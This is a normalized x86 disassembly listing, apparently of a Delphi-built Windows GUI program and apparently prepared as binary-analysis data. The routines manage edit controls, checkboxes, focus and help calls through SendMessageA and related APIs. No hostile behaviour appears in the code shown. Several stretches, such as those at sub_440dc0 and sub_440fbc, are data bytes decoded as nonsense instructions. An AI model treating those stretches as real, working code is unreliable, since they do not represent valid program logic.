mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
retn
push 0xfffffff0
mov eax esi
call sub_44d7a4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
push 0x0
push 0x3
push 0xd3
mov eax esi
call sub_44d7a4
push eax
call SendMessageA
sub_43fc5c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44cd84
pop esi
pop ebx
retn
cmp [ ebx + 0x20c ] 0x1
jne r-xdata
mov eax ebx
call sub_43fadc
mov eax ebx
call sub_44ad0c
sub_43fc90
push ebx
mov ebx eax
mov eax ebx
call sub_44ccc8
test [ ebx + 0x51 ] 0x2
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_43fb18
test [ ebx + 0x1c ] 0x1
jne r-xdata
sub_43fcd8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44cb20
pop esi
pop ebx
retn
test [ ebx + 0x54 ] 0x1
jne r-xdata
push 0xfffffff0
mov eax ebx
call sub_44d7a4
push eax
call GetWindowLongA
test al 0x4
jne r-xdata
mov eax ebx
call sub_43f79c
sub_43fd14
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44daa8
test al al
je r-xdata
mov eax esi
mov si 0xffb3
call sub_40358c
push 0xfffffff0
mov eax esi
call sub_44d7a4
push eax
call GetWindowLongA
test al 0x4
je r-xdata
pop esi
retn
sub_43fd4c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov edx esi
mov eax ebx
call sub_44e884
pop esi
pop ebx
retn
sub_43fd68
push ebx
push esi
mov ebx eax
xor esi esi
mov eax [ ebx + 0x10 ]
call sub_44daa8
test al al
jne r-xdata
push 0x0
push 0x0
push 0xba
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov esi eax
push 0x0
push 0x0
mov eax esi
dec eax
push eax
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
push eax
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
test eax eax
jne r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
retn
dec esi
sub_43fdd8
push ebx
push esi
push edi
add esp 0xfffff004
push eax
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov [ eax ] 0x1000
mov eax esp
push eax
push esi
push 0xc4
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov ecx eax
mov edx esp
mov eax edi
call sub_404210
add esp 0x1000
pop edi
pop esi
pop ebx
retn
sub_43fe1c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
push esi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
add eax esi
push eax
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov eax edi
call sub_4045e0
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
sub_43fe90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43ff7b
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff82
lea eax [ ebp - 0x8 ]
call sub_404120
retn
push 0x0
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
push 0x0
dec edi
push edi
push 0xbb
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov ebx eax
test ebx ebx
jl r-xdata
lea eax [ ebp - 0x8 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_40442c
jmp r-xdata
push 0x0
push ebx
push 0xc1
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
test eax eax
je r-xdata
push ebx
push ebx
push 0xb1
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov eax [ ebp - 0x8 ]
call sub_4045e0
push eax
push 0x0
push 0xc2
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
add ebx eax
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_40442c
sub_43ff8f
inc [ edx ]
add [ eax ] al
add [ 0xa ] cl
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov edi edx
mov ebx eax
push 0x0
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov esi eax
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
push 0x0
inc edi
push edi
push 0xbb
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov edi eax
test edi edi
jge r-xdata
push edi
push esi
push 0xb1
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
push 0x0
push 0xc2
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
push 0x0
push esi
push 0xc1
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
mov edi eax
add edi esi
sub_44003c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_44daa8
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ esi + 0x10 ]
call sub_448138
mov eax [ esi + 0x10 ]
call sub_4474c0
sub_4400a0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_440169
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax esi
call sub_4083a8
mov eax [ ebp - 0x4 ]
call sub_4043e0
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_446ef8
cmp esi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push 0x0
push 0xc
mov eax [ ebx + 0x10 ]
call sub_44d7a4
push eax
call SendMessageA
test eax eax
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_446f84
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40452c
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebx + 0x10 ]
call sub_448138
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440170
lea eax [ ebp - 0xc ]
call sub_404120
lea eax [ ebp - 0x8 ]
call sub_404120
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_440178
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43f408
mov edx 0xb9
mov eax ebx
call sub_446740
mov edx 0x59
mov eax ebx
call sub_446764
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebx + 0x226 ] 0x1
mov [ ebx + 0x227 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403360
mov esi eax
mov [ ebx + 0x220 ] esi
mov [ esi + 0x10 ] ebx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_440208
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov eax [ esi + 0x220 ]
call sub_403390
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4495bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_440238
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43f8f0
mov eax ebx
mov si 0xffc8
call sub_40358c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x224 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x226 ]
mov ecx [ ecx * 4 + rw-data ]
not ecx
and edx ecx
or edx 0x4
or eax edx
xor edx edx
mov dl [ ebx + 0x225 ]
or eax [ edx * 4 + rw-data ]
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_44029c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406f28
mov [ esi + 0x180 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x2
je r-xdata
test [ ebx + 0x5 ] 0x8
je r-xdata
mov eax [ ebx + 0x4 ]
and eax 0xfffff7ff
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx r-xdata
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406f28
mov edi eax
mov [ esi + 0x180 ] edi
test edi edi
je r-xdata
mov eax [ ebx ]
push eax
push 0x0
push 0xc
mov eax [ esi + 0x180 ]
push eax
call SendMessageA
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x1
push 0xcf
push edi
call SendMessageA
jmp r-xdata
sub_440365
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
push 0x0
push 0x0
push 0xb0
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
shr eax 0x10
movzx eax ax
mov [ esi ] eax
push 0x0
mov eax [ esi ]
push eax
push 0xc9
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov [ esi + 0x4 ] eax
push 0x0
push 0xffffffff
push 0xbb
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub [ esi ] eax
pop esi
pop ebx
retn
sub_4403c8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov eax [ esi + 0x4 ]
push eax
push 0xbb
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
add eax [ esi ]
mov esi eax
push esi
push esi
push 0xb1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop esi
pop ebx
retn
sub_440470
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x228 ] 0x0
je r-xdata
and [ esi + 0xc ] 0xfffffffd
or [ esi + 0xc ] 0x2
jmp r-xdata
pop esi
pop ebx
retn
and [ esi + 0xc ] 0xfffffffb
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
sub_4404ac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c750
cmp [ esi ] 0xd
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x227 ] 0x0
jne r-xdata
mov [ esi ] 0x0
sub_4404d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_449464
mov eax esi
mov edx [ r-xdata ]
call sub_403540
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4404f4
push ebx
mov ebx eax
mov eax ebx
call sub_453550
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403540
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_44052c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_440582
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_440590
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_449498
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4405e4
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44e274
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_440638
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44065c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44b180
mov eax ebx
mov si 0xffb5
call sub_40358c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_44d7a4
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40358c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4406d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43a564
mov ebx eax
mov eax ebx
call sub_43a644
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d7a4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43a744
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440720
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43a564
call sub_43a644
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44bbc0
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_44074c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a5f8
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_440784
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440590
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_446740
mov edx 0x19
mov eax esi
call sub_446764
mov dl 0x1
mov eax esi
call sub_44d9d8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_440810
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44daa8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_44d7a4
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_44d7a4
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_440864
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45dd9c
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_448138
sub_440898
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44074c
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44a524
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_440900
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44cbe8
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45dca4
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40358c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44096d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4409e6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45dd2c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44cbf0
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40358c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4409ed
sub_4409f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44cbf8
pop edi
pop esi
pop ebx
retn
sub_440a48
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43a564
call sub_43a644
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_440a74
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43a564
mov ebx eax
mov eax ebx
call sub_43a644
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44d7a4
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43a744
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440ac0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_440590
mov edx 0x61
mov eax esi
call sub_446740
mov edx 0x11
mov eax esi
call sub_446764
mov dl 0x1
mov eax esi
call sub_44d9d8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_440b2c
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40358c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_440b58
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_440be0
retn
mov dl 0x2
call sub_440be0
jmp r-xdata
xor edx edx
call sub_440be0
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_440be0
jmp r-xdata
sub_440be0
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44daa8
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40358c
sub_440c34
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44074c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44a524
mov eax ebx
mov si 0xffc8
call sub_40358c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_440c8f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6575173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
pop ebx
retn
sub_440cd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440d66
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_446f84
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45dd2c
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44cbf0
mov eax ebx
mov si 0xffb8
call sub_40358c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_40358c
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d6d
lea eax [ ebp - 0x4 ]
call sub_404120
retn
sub_440d84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440da9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440db0
retn
sub_440dc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
push cs
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx + 0x44 ] bl
add [ eax + 0x60000000 ] ah
sub eax 0x42180045
inc edx
add ah ah
xor eax 0x3b6c0040
inc edx
add ah ch
xor eax 0x35e00040
inc eax
add [ eax ] ch
xor eax [ eax ]
inc esp
xor eax [ eax ]
mov [ esi ] dh
inc ebp
add al bl
inc ebp
add [ eax ] ah
inc edx
add [ eax - 0x44 ] dl
inc ecx
add al bh
inc edx
add [ esp + eax * 2 + 0x42 ] dl
add [ eax - 0x5bffbad1 ] ch
cmp eax [ ebp ]
xor [ edx + 0x42 ] al
add [ eax ] bl
aas
inc edx
add [ eax ] dl
aas
inc edx
add [ eax ] bh
inc edx
inc edx
add [ eax + 0x1400440e ] dh
inc ebp
inc edx
add [ eax + 0x4c004244 ] bh
inc esp
inc edx
add [ esp + eax * 2 + 0x42 ] bh
add [ eax + 0x44 ] dl
inc edx
add ah bh
xor [ ebp ] al
int3
sub_440eb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_453634
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_440eec
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440f11
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440f18
retn
sub_440f24
push 0xfe004876
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_441887
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_441a14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44188e
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404144
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_4085c0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_44196c
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_4085c0
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_404174
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4410d0
mov eax [ ebp - 0x14 ]
call sub_4045e0
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
je r-xdata
cmp di 0x101
jne r-xdata
mov al 0x1
sub_440fbc
popfd
cmove eax [ eax ]
cmpsd [ esi ] [ edi ]
cmove eax [ eax ]
mov cl 0xf
inc esp
add [ ebp + 0xf ] dl
inc esp
add [ ebp + 0xf ] bl
inc esp
add [ ebp + 0xf ] ah
inc esp
add [ ebp + 0xf ] ch
inc esp
add [ ebp + 0xf ] dh
inc esp
add [ ebp + 0xf ] bh
cmp bh [ edi + ecx + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jge r-xdata
cmp bh [ edi + ecx + 0x200044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmove eax [ eax ]
cmove eax [ eax ]
cmp eax 0x4500440f
inc esp
add [ ebp - 0x72ffbbf1 ] al
cmove eax [ eax ]
xchg ebp eax
cmove eax [ eax ]
xor eax 0x3d00440f
cmove eax [ eax ]
inc ebp
dec ebp
